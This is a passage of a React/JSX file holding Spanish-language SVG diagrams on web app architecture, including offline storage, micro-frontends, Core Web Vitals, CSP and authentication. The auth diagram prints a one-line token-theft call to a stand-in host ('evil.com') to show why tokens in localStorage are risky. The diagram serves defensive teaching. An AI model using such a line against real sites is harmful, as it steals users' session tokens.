      <text x="160" y="174" fill={subtextColor} fontSize="6.5" textAnchor="middle">Arranque en frío (Cold Start) lento (1 a 3s)</text>

      {/* Edge Workers */}
      <rect x="330" y="50" width="280" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="470" y="68" fill="#10b981" fontWeight="bold" fontSize="10" textAnchor="middle">Edge SSR (V8 Isolates / Cloudflare / Vercel)</text>
      <rect x="345" y="80" width="250" height="28" rx="4" fill="#d1fae5" />
      <text x="470" y="97" fill="#047857" fontSize="7" fontWeight="bold" textAnchor="middle">&gt; 300 Puntos de Presencia (PoP) mundiales</text>
      <text x="345" y="122" fill="#10b981" fontSize="7.5" fontWeight="bold">• Ejecución a &lt; 20ms físicos del usuario</text>
      <text x="345" y="137" fill={textColor} fontSize="7">• <tspan fontWeight="bold">V8 Isolates</tspan>: Arranque en frío en &lt; 5 milisegundos</text>
      <text x="345" y="152" fill={subtextColor} fontSize="6.5">Middlewares de autenticación y A/B testing sin tocar origen</text>
      <text x="470" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">TTFB Mínimo Globalizado</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Edge SSR traslada la ejecución de Node.js a V8 Isolates ligeros en la CDN más cercana al usuario, logrando TTFB comparable a archivos estáticos.</text>
    </svg>
  );
  },

  "webapp-indexeddb-storage-offline": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Almacenamiento Offline Masivo: IndexedDB vs localStorage</text>

      {/* Left: localStorage limits */}
      <rect x="30" y="50" width="260" height="135" rx="8" fill={isDark ? "#1e293b" : "#f8fafc"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="160" y="68" fill="#ef4444" fontWeight="bold" fontSize="10" textAnchor="middle">localStorage (Sincrónico y Limitado)</text>
      <rect x="45" y="80" width="230" height="26" rx="4" fill="#fee2e2" />
      <text x="160" y="96" fill="#991b1b" fontSize="7" fontWeight="bold" textAnchor="middle">Límite Estricto: 5 MB en total</text>
      <text x="45" y="120" fill="#ef4444" fontSize="7">• Bloquea el Main Thread de JS (lecturas síncronas)</text>
      <text x="45" y="135" fill={textColor} fontSize="7">• Solo almacena strings planos (requiere JSON.stringify)</text>
      <text x="45" y="150" fill={subtextColor} fontSize="6.5">Sin soporte de índices ni transacciones ACID</text>
      <text x="160" y="174" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Inviable para Apps Offline Complejas</text>

      {/* Right: IndexedDB capabilities */}
      <rect x="330" y="50" width="280" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="470" y="68" fill="#10b981" fontWeight="bold" fontSize="10" textAnchor="middle">IndexedDB (NoSQL Transaccional Asíncrono)</text>
      <rect x="345" y="80" width="250" height="26" rx="4" fill="#d1fae5" />
      <text x="470" y="96" fill="#047857" fontSize="7" fontWeight="bold" textAnchor="middle">Capacidad: Cientos de Gigabytes (% de disco libre)</text>
      <text x="345" y="120" fill="#10b981" fontSize="7.5" fontWeight="bold">• 100% Asíncrono sin congelar la UI a 60 FPS</text>
      <text x="345" y="135" fill={textColor} fontSize="7">• Guarda Blobs, TypedArrays, imágenes y objetos complejos</text>
      <text x="345" y="150" fill={textColor} fontSize="7">• Soporta transacciones ACID y búsqueda por Índices</text>
      <text x="470" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">Ideal para SQLite WASM y Outbox Queues</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">IndexedDB es el pilar de almacenamiento para aplicaciones offline-first: asíncrono, transaccional y capaz de persistir gigabytes de datos en local.</text>
    </svg>
  );
  },

  "webapp-offline-first-conflict-resolution": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Arquitectura Offline-First: Cola de Mutaciones (Outbox) &amp; Resolución de Conflictos</text>

      {/* Offline Action */}
      <rect x="30" y="50" width="170" height="135" rx="8" fill={isDark ? "#1e293b" : "#f1f5f9"} stroke={border} />
      <text x="115" y="68" fill={textColor} fontWeight="bold" fontSize="9.5" textAnchor="middle">1. Usuario Offline</text>
      <rect x="40" y="78" width="150" height="28" rx="4" fill="#f59e0b" fillOpacity="0.2" stroke="#f59e0b" />
      <text x="115" y="92" fill="#d97706" fontSize="7" fontWeight="bold" textAnchor="middle">Mutación: Editar Tarea</text>
      <text x="115" y="101" fill={subtextColor} fontSize="6" textAnchor="middle">(Sin conexión a internet)</text>
      <text x="45" y="125" fill="#10b981" fontSize="7">✓ UI optimista actualiza instant</text>
      <text x="45" y="140" fill={textColor} fontSize="7">• Mutación se persiste en:</text>
      <text x="45" y="152" fill="#3b82f6" fontSize="6.5" fontFamily="monospace">IndexedDB (Outbox Queue)</text>
      <text x="115" y="174" fill="#f59e0b" fontSize="6.5" fontWeight="bold" textAnchor="middle">Cero Pérdida de Datos</text>

      {/* Sync Manager */}
      <rect x="225" y="50" width="190" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="320" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. Reconexión &amp; Background Sync</text>
      <text x="235" y="88" fill={textColor} fontSize="7">• Browser detecta evento <tspan fontWeight="bold">&apos;online&apos;</tspan></text>
      <text x="235" y="103" fill={textColor} fontSize="7">• Service Worker drena la cola Outbox</text>
      <rect x="235" y="115" width="170" height="26" rx="3" fill={isDark ? "#312e81" : "#c7d2fe"} />
      <text x="320" y="131" fill="#4338ca" fontSize="6.5" fontFamily="monospace" textAnchor="middle">POST /api/sync/mutations</text>
      <text x="235" y="155" fill="#3b82f6" fontSize="7" fontWeight="bold">• Reintentos automáticos con backoff</text>
      <text x="320" y="174" fill={subtextColor} fontSize="6.5" textAnchor="middle">Sincronización en Segundo Plano</text>

      {/* Conflict Resolution */}
      <rect x="440" y="50" width="170" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="525" y="68" fill="#10b981" fontWeight="bold" fontSize="9.5" textAnchor="middle">3. Resolución de Conflicto</text>
      <text x="450" y="88" fill={textColor} fontSize="7">• ¿Otro usuario editó lo mismo?</text>
      <rect x="450" y="98" width="150" height="24" rx="3" fill="#d1fae5" />
      <text x="525" y="113" fill="#047857" fontSize="6.5" fontWeight="bold" textAnchor="middle">CRDTs (Yjs / Automerge)</text>
      <text x="450" y="135" fill="#10b981" fontSize="7">• Fusión matemática sin pérdida</text>
      <text x="450" y="148" fill={textColor} fontSize="6.5">• o Last-Write-Wins con vector clocks</text>
      <text x="525" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">Consistencia Eventual Garantizada</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Offline-First trata a la red como una mejora progresiva: escribe primero en local (IndexedDB) y sincroniza con CRDTs al recuperar conexión.</text>
    </svg>
  );
  },

  "webapp-micro-frontends-routing": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Patrones de Integración de Micro-Frontends</text>

      {/* Pattern 1: Edge Routing */}
      <rect x="30" y="50" width="180" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="120" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9.5" textAnchor="middle">1. Routing en Edge / Reverse Proxy</text>
      <text x="40" y="88" fill={textColor} fontSize="7">• /checkout ➔ App 1 (Next.js)</text>
      <text x="40" y="101" fill={textColor} fontSize="7">• /dashboard ➔ App 2 (Vite)</text>
      <text x="40" y="114" fill={textColor} fontSize="7">• /blog ➔ App 3 (Astro)</text>
      <text x="40" y="132" fill="#10b981" fontSize="7" fontWeight="bold">✓ Aislamiento total (cero acoplamiento)</text>
      <text x="40" y="145" fill={subtextColor} fontSize="6.5">Desventaja: recarga completa entre apps</text>
      <text x="120" y="174" fill="#2563eb" fontSize="7" fontWeight="bold" textAnchor="middle">Máxima Simplicidad</text>

      {/* Pattern 2: Web Components */}
      <rect x="230" y="50" width="180" height="135" rx="8" fill={isDark ? "#311042" : "#fdf4ff"} stroke="#c026d3" strokeWidth="1.5" />
      <text x="320" y="68" fill="#c026d3" fontWeight="bold" fontSize="9.5" textAnchor="middle">2. Web Components (Custom Elements)</text>
      <rect x="240" y="80" width="160" height="24" rx="3" fill={isDark ? "#4c1d95" : "#ede9fe"} />
      <text x="320" y="96" fill="#a855f7" fontSize="6.5" fontFamily="monospace" textAnchor="middle">&lt;user-profile-widget /&gt;</text>
      <text x="240" y="120" fill={textColor} fontSize="7">• Encapsulación CSS con Shadow DOM</text>
      <text x="240" y="133" fill={textColor} fontSize="7">• Independiente del framework</text>
      <text x="240" y="146" fill="#c026d3" fontSize="7">Framework-agnostic</text>
      <text x="320" y="174" fill="#9333ea" fontSize="7" fontWeight="bold" textAnchor="middle">Encapsulación Nativa</text>

      {/* Pattern 3: Module Federation */}
      <rect x="430" y="50" width="180" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="520" y="68" fill="#10b981" fontWeight="bold" fontSize="9.5" textAnchor="middle">3. Module Federation (Runtime)</text>
      <text x="440" y="88" fill={textColor} fontSize="7">• Carga remota en memoria</text>
      <text x="440" y="101" fill={textColor} fontSize="7">• Comparte React como Singleton</text>
      <text x="440" y="114" fill="#10b981" fontSize="7" fontWeight="bold">✓ Cero recargas de página (SPA feeling)</text>
      <text x="440" y="132" fill={textColor} fontSize="7">• Despliegues 100% independientes</text>
      <text x="440" y="145" fill={subtextColor} fontSize="6.5">Requiere gobernanza de dependencias</text>
      <text x="520" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">El Estándar Enterprise</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Elegir la estrategia de Micro-frontends depende de la necesidad: Edge Routing para desacoplamiento total; Module Federation para UX fluida.</text>
    </svg>
  );
  },

  "webapp-core-web-vitals-metrics": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Las 3 Core Web Vitals Oficiales de Google</text>

      {/* 1. LCP */}
      <rect x="30" y="50" width="180" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="120" y="68" fill="#3b82f6" fontWeight="bold" fontSize="10" textAnchor="middle">LCP (Carga)</text>
      <text x="120" y="80" fill={subtextColor} fontSize="6.5" textAnchor="middle">Largest Contentful Paint</text>
      <rect x="45" y="90" width="150" height="28" rx="4" fill="#d1fae5" />
      <text x="120" y="104" fill="#047857" fontSize="7.5" fontWeight="bold" textAnchor="middle">BUENO: &lt;= 2.5 seg</text>
      <text x="120" y="113" fill="#065f46" fontSize="6" textAnchor="middle">Pobre: &gt; 4.0 seg</text>
      <text x="40" y="135" fill={textColor} fontSize="7">• Render del bloque visual más grande</text>
      <text x="40" y="148" fill={textColor} fontSize="7">• Optimizar imágenes hero y precargas</text>
      <text x="120" y="174" fill="#2563eb" fontSize="7" fontWeight="bold" textAnchor="middle">Percepción de Velocidad</text>

      {/* 2. INP */}
      <rect x="230" y="50" width="180" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="320" y="68" fill="#10b981" fontWeight="bold" fontSize="10" textAnchor="middle">INP (Interactividad)</text>
      <text x="320" y="80" fill={subtextColor} fontSize="6.5" textAnchor="middle">Interaction to Next Paint (Reemplazó FID)</text>
      <rect x="245" y="90" width="150" height="28" rx="4" fill="#d1fae5" />
      <text x="320" y="104" fill="#047857" fontSize="7.5" fontWeight="bold" textAnchor="middle">BUENO: &lt;= 200 ms</text>
      <text x="320" y="113" fill="#065f46" fontSize="6" textAnchor="middle">Pobre: &gt; 500 ms</text>
      <text x="240" y="135" fill={textColor} fontSize="7">• Mide latencia de TODOS los clicks</text>
      <text x="240" y="148" fill={textColor} fontSize="7">• Reducir tareas largas en Main Thread</text>
      <text x="320" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">Sensación de Respuesta</text>

      {/* 3. CLS */}
      <rect x="430" y="50" width="180" height="135" rx="8" fill={isDark ? "#431407" : "#fff7ed"} stroke="#f97316" strokeWidth="1.5" />
      <text x="520" y="68" fill="#f97316" fontWeight="bold" fontSize="10" textAnchor="middle">CLS (Estabilidad)</text>
      <text x="520" y="80" fill={subtextColor} fontSize="6.5" textAnchor="middle">Cumulative Layout Shift</text>
      <rect x="445" y="90" width="150" height="28" rx="4" fill="#d1fae5" />
      <text x="520" y="104" fill="#047857" fontSize="7.5" fontWeight="bold" textAnchor="middle">BUENO: &lt;= 0.1</text>
      <text x="520" y="113" fill="#065f46" fontSize="6" textAnchor="middle">Pobre: &gt; 0.25</text>
      <text x="440" y="135" fill={textColor} fontSize="7">• Movimientos inesperados de UI</text>
      <text x="440" y="148" fill={textColor} fontSize="7">• Reservar width/height en imágenes y ads</text>
      <text x="520" y="174" fill="#ea580c" fontSize="7" fontWeight="bold" textAnchor="middle">Fidelidad Visual sin Saltos</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Las Core Web Vitals impactan directamente el ranking en Google: LCP mide carga, INP interactividad real y CLS estabilidad visual.</text>
    </svg>
  );
  },

  "webapp-content-security-policy": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Content Security Policy (CSP): Blindaje contra Cross-Site Scripting (XSS)</text>

      {/* Left: CSP Header Directives */}
      <rect x="30" y="50" width="310" height="135" rx="8" fill={isDark ? "#0f172a" : "#1e293b"} />
      <text x="45" y="68" fill="#38bdf8" fontSize="7.5" fontFamily="monospace">Content-Security-Policy:</text>
      <text x="45" y="85" fill="#a5b4fc" fontSize="7" fontFamily="monospace">default-src &apos;self&apos;;</text>
      <text x="45" y="98" fill="#34d399" fontSize="7" fontFamily="monospace">script-src &apos;self&apos; &apos;nonce-rAnd0m123&apos;;</text>
      <text x="45" y="111" fill="#f59e0b" fontSize="7" fontFamily="monospace">style-src &apos;self&apos; &apos;unsafe-inline&apos;;</text>
      <text x="45" y="124" fill="#e879f9" fontSize="7" fontFamily="monospace">img-src &apos;self&apos; https://images.acme.com data:;</text>
      <text x="45" y="137" fill="#f87171" fontSize="7" fontFamily="monospace">connect-src &apos;self&apos; https://api.acme.com;</text>
      <text x="45" y="150" fill="#94a3b8" fontSize="7" fontFamily="monospace">frame-ancestors &apos;none&apos;;</text>
      <text x="45" y="165" fill="#ef4444" fontSize="6.5" fontFamily="monospace"># Bloquea ejecución de scripts inline sin nonce</text>

      {/* Right: Security Protections */}
      <rect x="360" y="50" width="250" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="485" y="68" fill="#10b981" fontWeight="bold" fontSize="9.5" textAnchor="middle">Protecciones Activas</text>
      <text x="370" y="90" fill={textColor} fontSize="7">• <tspan fontWeight="bold">Mitigación de XSS</tspan>: Scripts inyectados por atacantes no tienen el nonce válido y el navegador los bloquea.</text>
      <text x="370" y="115" fill={textColor} fontSize="7">• <tspan fontWeight="bold">Anti-Clickjacking</tspan>: frame-ancestors &apos;none&apos; impide embeber la app en iframes maliciosos.</text>
      <text x="370" y="140" fill={textColor} fontSize="7">• <tspan fontWeight="bold">Exfiltración Bloqueada</tspan>: connect-src restringe llamadas a endpoints no autorizados.</text>
      <text x="485" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">Defensa en Profundidad</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Una cabecera CSP estricta con Nonces criptográficos es la barrera técnica más efectiva contra la inyección de código JavaScript malicioso.</text>
    </svg>
  );
  },

  "webapp-auth-security-tokens": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Autenticación Segura en WebApps: Cookies HttpOnly vs LocalStorage</text>

      {/* Left: Dangerous localStorage */}
      <rect x="30" y="50" width="260" height="135" rx="8" fill={isDark ? "#3f1d1d" : "#fef2f2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="160" y="68" fill="#ef4444" fontWeight="bold" fontSize="10" textAnchor="middle">❌ Anti-patrón: Tokens en localStorage</text>
      <rect x="45" y="80" width="230" height="28" rx="4" fill="#fee2e2" />
      <text x="160" y="98" fill="#991b1b" fontSize="6.5" fontFamily="monospace" textAnchor="middle">localStorage.setItem(&apos;token&apos;, jwtToken);</text>
      <text x="45" y="125" fill="#ef4444" fontSize="7">• <tspan fontWeight="bold">Vulnerable a XSS</tspan>: Cualquier script inyectado o dependencia maliciosa puede leer el token:</text>
      <text x="50" y="138" fill="#991b1b" fontSize="6.5" fontFamily="monospace">fetch(&apos;evil.com?t=&apos; + localStorage.token)</text>
      <text x="45" y="155" fill={textColor} fontSize="6.5">Secuestro total de la sesión del usuario</text>
      <text x="160" y="174" fill="#ef4444" fontSize="7" fontWeight="bold" textAnchor="middle">Riesgo Crítico de Seguridad</text>

      {/* Right: Secure HttpOnly Cookie */}
      <rect x="330" y="50" width="280" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="470" y="68" fill="#10b981" fontWeight="bold" fontSize="10" textAnchor="middle">✅ Estándar Enterprise: Cookies HttpOnly + SameSite</text>
      <rect x="345" y="80" width="250" height="34" rx="4" fill="#d1fae5" />
      <text x="355" y="94" fill="#047857" fontSize="6.5" fontFamily="monospace">Set-Cookie: session=xyz; HttpOnly; Secure;</text>
      <text x="355" y="106" fill="#047857" fontSize="6.5" fontFamily="monospace">SameSite=Strict; Path=/; Max-Age=86400</text>
      <text x="345" y="128" fill="#10b981" fontSize="7" fontWeight="bold">• <tspan fontWeight="bold">HttpOnly</tspan>: JavaScript NO puede leer la cookie</text>
      <text x="345" y="141" fill={textColor} fontSize="7">• <tspan fontWeight="bold">SameSite=Strict/Lax</tspan>: Inmune a ataques CSRF</text>
      <text x="345" y="154" fill={textColor} fontSize="7">• <tspan fontWeight="bold">Secure</tspan>: Solo se transmite por canales HTTPS cifrados</text>
      <text x="470" y="174" fill="#059669" fontSize="7" fontWeight="bold" textAnchor="middle">Protección Inmune a XSS</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">NUNCA almacenes tokens JWT en localStorage; utiliza cookies con atributos HttpOnly, Secure y SameSite para delegar la custodia al navegador.</text>
    </svg>
  );
  },

  "webapp-memory-leaks-devtools": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Diagnóstico de Fugas de Memoria (Memory Leaks) en SPAs</text>

      {/* Causes Box */}
      <rect x="30" y="50" width="180" height="135" rx="8" fill={isDark ? "#3f1d1d" : "#fef2f2"} stroke="#ef4444" strokeWidth="1.5" />
      <text x="120" y="68" fill="#ef4444" fontWeight="bold" fontSize="9.5" textAnchor="middle">Causas Comunes en React</text>
      <text x="40" y="88" fill={textColor} fontSize="7">1. <tspan fontWeight="bold">Event Listeners</tspan> sin cleanup:</text>
      <text x="45" y="99" fill="#ef4444" fontSize="6" fontFamily="monospace">window.addEventListener(&apos;resize&apos;)</text>
      <text x="40" y="114" fill={textColor} fontSize="7">2. <tspan fontWeight="bold">Timers olvidados</tspan> (setInterval)</text>
      <text x="40" y="127" fill={textColor} fontSize="7">3. <tspan fontWeight="bold">Detached DOM Nodes</tspan></text>
      <text x="40" y="140" fill={textColor} fontSize="7">4. Closures en variables globales</text>
      <text x="120" y="174" fill="#ef4444" fontSize="6.5" fontWeight="bold" textAnchor="middle">La RAM aumenta con el uso</text>

      {/* DevTools Diagnosis */}
      <rect x="230" y="50" width="190" height="135" rx="8" fill={isDark ? "#172554" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="325" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9.5" textAnchor="middle">Chrome DevTools Memory</text>
      <rect x="240" y="80" width="170" height="26" rx="3" fill={isDark ? "#1e3a8a" : "#dbeafe"} />
      <text x="325" y="96" fill="#1d4ed8" fontSize="7" fontWeight="bold" textAnchor="middle">3 Heap Snapshots Technique</text>
      <text x="240" y="118" fill={textColor} fontSize="7">1. Snapshot 1 (Estado base)</text>
      <text x="240" y="131" fill={textColor} fontSize="7">2. Abrir y cerrar la vista 10 veces</text>
      <text x="240" y="144" fill={textColor} fontSize="7">3. Snapshot 2 y filtrar: <tspan fontWeight="bold">&quot;Objects allocated between 1 and 2&quot;</tspan></text>
      <text x="325" y="174" fill="#2563eb" fontSize="6.5" fontWeight="bold" textAnchor="middle">Identifica objetos que no se liberan</text>

      {/* Resolution */}
      <rect x="440" y="50" width="170" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="525" y="68" fill="#10b981" fontWeight="bold" fontSize="9.5" textAnchor="middle">Patrón de Remediación</text>
      <rect x="450" y="80" width="150" height="42" rx="3" fill="#d1fae5" />
      <text x="455" y="94" fill="#047857" fontSize="6" fontFamily="monospace">useEffect(() =&gt; &#123;</text>
      <text x="455" y="104" fill="#047857" fontSize="6" fontFamily="monospace">  const id = setInterval(...);</text>
      <text x="455" y="114" fill="#047857" fontSize="6" fontFamily="monospace">  return () =&gt; clearInterval(id);</text>
      <text x="450" y="136" fill="#10b981" fontSize="7" fontWeight="bold">✓ Retorno de Cleanup Function</text>
      <text x="450" y="149" fill={textColor} fontSize="6.5">• AbortController para fetch</text>
      <text x="525" y="174" fill="#059669" fontSize="6.5" fontWeight="bold" textAnchor="middle">Memoria Estable y Predecible</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">En SPAs donde el usuario pasa horas sin recargar, limpiar timers, observers y suscripciones en el desmontaje es vital para evitar el colapso del navegador.</text>
    </svg>
  );
  },

  "webapp-web-workers-multithreading": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Multi-Threading en el Navegador con Web Workers &amp; Comlink</text>

      {/* Main Thread */}
      <rect x="30" y="50" width="220" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="140" y="68" fill="#3b82f6" fontWeight="bold" fontSize="10" textAnchor="middle">Main Thread (Hilo Principal)</text>
      <text x="45" y="88" fill={textColor} fontSize="7">• Renderizado de DOM y CSS</text>
      <text x="45" y="102" fill={textColor} fontSize="7">• Gestión de eventos de usuario (clicks/scroll)</text>
      <text x="45" y="116" fill="#10b981" fontSize="7" fontWeight="bold">• 60 FPS fluidos (Frame budget: 16ms)</text>
      <rect x="45" y="130" width="190" height="26" rx="4" fill="#dbeafe" />
      <text x="140" y="146" fill="#1e40af" fontSize="6.5" fontWeight="bold" textAnchor="middle">CERO Tareas Pesadas Bloqueantes</text>
      <text x="140" y="174" fill={subtextColor} fontSize="6" textAnchor="middle">Mantiene excelente puntuación de INP</text>

      {/* Communication Bridge */}
      <rect x="260" y="70" width="120" height="95" rx="6" fill={isDark ? "#311042" : "#fdf4ff"} stroke="#c026d3" />
      <text x="320" y="88" fill="#c026d3" fontWeight="bold" fontSize="8" textAnchor="middle">Comlink / postMessage</text>
      <text x="320" y="104" fill="#a855f7" fontSize="6.5" textAnchor="middle">RPC Asíncrono</text>
      <text x="320" y="118" fill="#818cf8" fontSize="10" fontWeight="bold" textAnchor="middle">⇄</text>
      <text x="320" y="134" fill={textColor} fontSize="6" textAnchor="middle">Transferable Objects</text>
      <text x="320" y="146" fill={subtextColor} fontSize="5.5" textAnchor="middle">(ArrayBuffer sin copia)</text>

      {/* Web Worker Thread */}
      <rect x="390" y="50" width="220" height="135" rx="8" fill={isDark ? "#064e3b" : "#ecfdf5"} stroke="#10b981" strokeWidth="1.5" />
      <text x="500" y="68" fill="#10b981" fontWeight="bold" fontSize="10" textAnchor="middle">Web Worker (Hilo de Fondo)</text>
      <text x="405" y="88" fill={textColor} fontSize="7">• Hilo de ejecución de SO independiente</text>
      <text x="405" y="102" fill={textColor} fontSize="7">• Sin acceso al DOM (window/document)</text>
      <text x="405" y="116" fill="#047857" fontSize="7" fontWeight="bold">• Tareas intensivas de CPU:</text>
      <text x="410" y="128" fill="#059669" fontSize="6.5">  - Criptografía y hashing de archivos</text>
      <text x="410" y="140" fill="#059669" fontSize="6.5">  - Filtros y edición de imágenes/video</text>
      <text x="410" y="152" fill="#059669" fontSize="6.5">  - Parseo de archivos CSV de 500 MB</text>
      <text x="500" y="174" fill="#047857" fontSize="6.5" fontWeight="bold" textAnchor="middle">Cálculo en Paralelo sin Congelar UI</text>

      <rect x="25" y="192" width="590" height="15" rx="3" fill={isDark ? "#1e293b" : "#f1f5f9"} />
      <text x="320" y="203" fill={subtextColor} fontSize="7.5" textAnchor="middle">Mover cálculos intensivos a Web Workers libera el Main Thread, garantizando que los eventos de click y scroll respondan en menos de 16 milisegundos.</text>
    </svg>
  );
  },

  "webapp-push-notifications-webpush": ({ isDark, textColor, subtextColor, border }) => {
  return (
    <svg viewBox="0 0 640 220" className="w-full h-auto max-h-72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="10" y="10" width="620" height="200" rx="12" fill={isDark ? "#111827" : "#f8fafc"} stroke={border} strokeWidth="1.5" />
      <text x="320" y="30" fill={textColor} fontWeight="bold" fontSize="13" textAnchor="middle">Flujo de Notificaciones Push en la Web (Web Push Protocol &amp; VAPID)</text>

      {/* Step 1: App Server */}
      <rect x="30" y="50" width="170" height="135" rx="8" fill={isDark ? "#1e1b4b" : "#eff6ff"} stroke="#3b82f6" strokeWidth="1.5" />
      <text x="115" y="68" fill="#3b82f6" fontWeight="bold" fontSize="9" textAnchor="middle">1. Servidor de la App (Backend)</text>
      <text x="40" y="88" fill={textColor} fontSize="7">• Genera claves VAPID (Keys)</text>
      <text x="40" y="102" fill={textColor} fontSize="7">• Almacena PushSubscription:</text>
      <text x="45" y="114" fill="#2563eb" fontSize="6" fontFamily="monospace">&#123; endpoint, p256dh, auth &#125;</text>
      <text x="40" y="132" fill="#3b82f6" fontSize="7" fontWeight="bold">• Envía payload cifrado al Push Service</text>
